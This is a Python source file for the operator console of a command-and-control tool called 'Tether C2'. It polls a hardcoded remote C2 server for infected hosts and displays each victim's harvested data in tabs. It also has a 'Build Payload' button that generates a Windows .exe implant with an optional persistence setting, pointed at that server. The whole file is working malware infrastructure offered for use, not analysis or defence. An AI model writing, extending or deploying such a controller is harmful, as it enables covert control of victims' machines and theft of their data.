import customtkinter as ctk
from tkinter import filedialog, messagebox
import requests
import threading
import time
import re

from ..builder import build_payload

C2_SERVER_URL = "https://tether-c2-communication-line-by-ebowluh.onrender.com"

class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.sessions = {}
        self.session_buttons = {}

        # --- NEW: Instance variables for the detail view widgets ---
        # We need to store references to these so they can be updated by helper methods.
        self.detail_view_tab_buttons = {}
        self.detail_view_content_textbox = None
        self.detail_view_data_map = {}

        # --- Window Setup ---
        self.title("Tether C2")
        self.geometry("1024x600") # Wider to accommodate the side panel
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        # --- Main View Frames ---
        self.home_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")
        self.home_frame.grid_columnconfigure(0, weight=1)
        self.home_frame.grid_rowconfigure(2, weight=1)

        self.session_detail_frame = ctk.CTkFrame(self, fg_color="transparent")

        # --- Populate and Start ---
        self.setup_home_frame_widgets()
        self.start_polling()

    def setup_home_frame_widgets(self):
        """Creates all the widgets for the main landing page."""
        # --- Builder Frame ---
        builder_frame = ctk.CTkFrame(self.home_frame, corner_radius=0)
        builder_frame.grid(row=0, column=0, columnspan=2, sticky="ew", padx=10, pady=10)
        builder_frame.grid_columnconfigure(1, weight=1)
        ctk.CTkLabel(builder_frame, text="Payload Name:").grid(row=0, column=0, padx=(10, 5), pady=10, sticky="w")
        self.payload_name_entry = ctk.CTkEntry(builder_frame, placeholder_text="my_payload")
        self.payload_name_entry.grid(row=0, column=1, columnspan=2, sticky="ew", padx=5, pady=10)
        self.resilience_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(builder_frame, text="Enable Resilience", variable=self.resilience_var).grid(row=1, column=0, padx=(10, 5), pady=5, sticky="w")
        self.debug_mode_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(builder_frame, text="Debug Mode (Show Console)", variable=self.debug_mode_var).grid(row=1, column=1, padx=5, pady=5, sticky="w")
        self.build_button = ctk.CTkButton(builder_frame, text="Build Payload", command=self.build_payload_handler)
        self.build_button.grid(row=0, column=3, rowspan=2, padx=(5, 10), pady=10, sticky="ns")
        
        # --- Sessions Header ---
        sessions_label_frame = ctk.CTkFrame(self.home_frame, corner_radius=0, fg_color="transparent")
        sessions_label_frame.grid(row=1, column=0, columnspan=2, padx=10, pady=(10, 0), sticky="ew")
        self.sessions_label = ctk.CTkLabel(sessions_label_frame, text="Active Sessions", font=ctk.CTkFont(weight="bold"))
        self.sessions_label.pack()
        
        # --- Sessions Frame ---
        self.sessions_frame = ctk.CTkScrollableFrame(self.home_frame, corner_radius=0)
        self.sessions_frame.grid(row=2, column=0, columnspan=2, padx=10, pady=(0, 10), sticky="nsew")

    def start_polling(self):
        self.polling_active = True
        self.poll_thread = threading.Thread(target=self.poll_for_sessions, daemon=True)
        self.poll_thread.start()
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    # --- VIEW SWITCHING AND DATA DISPLAY LOGIC (HEAVILY MODIFIED) ---

    def show_home_view(self):
        """Hides the detail view and shows the home view."""
        self.session_detail_frame.grid_forget()
        self.home_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")

    def show_session_data(self, session_id):
        """Hides the home view and builds the detailed data view for a session."""
        session_data = self.sessions.get(session_id)
        if not session_data: return

        # Hide the home frame and show the detail frame
        self.home_frame.grid_forget()
        self.session_detail_frame.grid(row=0, column=0, rowspan=2, sticky="nsew", padx=10, pady=10)
        # Configure the detail frame grid: column 0 (side panel) has a fixed width, column 1 (content) takes the rest
        self.session_detail_frame.grid_columnconfigure(0, weight=0) 
        self.session_detail_frame.grid_columnconfigure(1, weight=1)
        self.session_detail_frame.grid_rowconfigure(1, weight=1)

        # Clear any old widgets from the frame
        for widget in self.session_detail_frame.winfo_children():
            widget.destroy()

        # --- Populate the Detail Frame ---
        # 1. Header with Back button and Hostname
        header_frame = ctk.CTkFrame(self.session_detail_frame, fg_color="transparent")
        header_frame.grid(row=0, column=0, columnspan=2, sticky="ew", pady=(0, 10))
        header_frame.grid_columnconfigure(1, weight=1)
        ctk.CTkButton(header_frame, text="< Back to Sessions", command=self.show_home_view).grid(row=0, column=0, sticky="w")
        ctk.CTkLabel(header_frame, text=session_data.get('hostname', 'N/A'), font=ctk.CTkFont(size=16, weight="bold")).grid(row=0, column=1, sticky="w", padx=20)

        # 2. Create the Left Side Panel (Our Vertical Tabs)
        tab_panel = ctk.CTkScrollableFrame(self.session_detail_frame, width=200, corner_radius=0)
        tab_panel.grid(row=1, column=0, sticky="nsw", padx=(0, 5))

        # 3. Create the Right Content Panel
        content_panel = ctk.CTkFrame(self.session_detail_frame, corner_radius=0, fg_color="transparent")
        content_panel.grid(row=1, column=1, sticky="nsew")
        content_panel.grid_rowconfigure(0, weight=1)
        content_panel.grid_columnconfigure(0, weight=1)
        self.detail_view_content_textbox = ctk.CTkTextbox(content_panel, wrap="word", corner_radius=0)
        self.detail_view_content_textbox.grid(row=0, column=0, sticky="nsew")

        # --- Parse Data and Create Tab Buttons ---
        self.detail_view_tab_buttons = {}
        harvested_text = session_data.get("data", "No data available.")
        pattern = re.compile(r"--- (.*?) ---\n\n(.*?)(?=\n\n---|\Z)", re.DOTALL)
        matches = pattern.findall(harvested_text)

        # Store the parsed data in a map for easy access
        self.detail_view_data_map = {title.strip(): content.strip() for title, content in matches}

        if not self.detail_view_data_map:
            # Handle case where parsing fails
            tab_panel.pack_forget() # Hide the empty panel
            self.detail_view_content_textbox.insert("0.0", harvested_text)
            self.detail_view_content_textbox.configure(state="disabled")
        else:
            # Create a button in the side panel for each data category
            for title in self.detail_view_data_map.keys():
                button = ctk.CTkButton(
                    tab_panel,
                    text=title,
                    anchor="w", # Align text to the left
                    fg_color="transparent", # Default state color
                    command=lambda t=title: self.update_content_view(t)
                )
                button.pack(fill="x", padx=5, pady=2)
                self.detail_view_tab_buttons[title] = button
            
            # Show the content for the very first tab by default
            first_tab_title = list(self.detail_view_data_map.keys())[0]
            self.update_content_view(first_tab_title)

    def update_content_view(self, selected_title):
        """
        This function is called when a vertical tab button is clicked.
        It updates the content textbox and highlights the active button.
        """
        # Update the content in the textbox
        content = self.detail_view_data_map.get(selected_title, "Content not found.")
        self.detail_view_content_textbox.configure(state="normal") # Enable writing
        self.detail_view_content_textbox.delete("0.0", "end")
        self.detail_view_content_textbox.insert("0.0", content)
        self.detail_view_content_textbox.configure(state="disabled") # Disable writing

        # Update button colors to show which is active
        for title, button in self.detail_view_tab_buttons.items():
            if title == selected_title:
                button.configure(fg_color="gray20") # Highlighted color
            else:
                button.configure(fg_color="transparent") # Default color

    # --- UNCHANGED METHODS FROM HERE DOWN ---
    def on_closing(self):
        self.polling_active = False
        self.destroy()

    def poll_for_sessions(self):
        while self.polling_active:
            try:
                response = requests.get(C2_SERVER_URL + "/api/get_sessions", timeout=10)
                response.raise_for_status()
                server_sessions = response.json()
                self.after(0, self.update_gui_with_sessions, server_sessions)
            except requests.exceptions.RequestException as e:
                self.after(0, self.update_sessions_label, f"Error Connecting: {e.__class__.__name__}")
            time.sleep(5)

    def update_sessions_label(self, text):
        self.sessions_label.configure(text=text)

    def update_gui_with_sessions(self, server_sessions):
        self.update_sessions_label(f"Active Sessions ({len(server_sessions)})")
        current_session_ids = {s["session_id"] for s in server_sessions}
        
        for session_data in server_sessions:
            sid = session_data["session_id"]
            if sid not in self.session_buttons:
                self.sessions[sid] = session_data
                self.add_session_button(sid, session_data["hostname"])

        for session_data in server_sessions:
            sid = session_data["session_id"]
            button = self.session_buttons.get(sid)
            if button:
                is_active = (time.time() - session_data.get("last_seen", 0)) < 45
                button.configure(fg_color="green" if is_active else "orange")
                
        for sid, button in list(self.session_buttons.items()):
            if sid not in current_session_ids:
                button.destroy()
                del self.session_buttons[sid]
                del self.sessions[sid]

    def build_payload_handler(self):
        payload_name = self.payload_name_entry.get()
        if not payload_name or not payload_name.isalnum():
            messagebox.showerror("Error", "Payload Name must be alphanumeric.")
            return
        output_dir = filedialog.askdirectory(title="Select Save Directory")
        if not output_dir: return

        self.build_button.configure(state="disabled", text="Building...")
        self.update_idletasks()

        success = build_payload(
            payload_name=payload_name, c2_url=C2_SERVER_URL,
            resilience_enabled=self.resilience_var.get(),
            output_dir=output_dir, debug_mode=self.debug_mode_var.get()
        )

        if success: messagebox.showinfo("Success", f"Payload '{payload_name}.exe' built!")
        else: messagebox.showerror("Build Failed", "Error during build. Check console.")
        self.build_button.configure(state="normal", text="Build Payload")

    def add_session_button(self, session_id, hostname):
        button_text = f"  {hostname}  |  {session_id[:8]}...  "
        button = ctk.CTkButton(
            self.sessions_frame, text=button_text,
            command=lambda sid=session_id: self.show_session_data(sid)
        )
        button.pack(fill="x", padx=5, pady=3)
        self.session_buttons[session_id] = button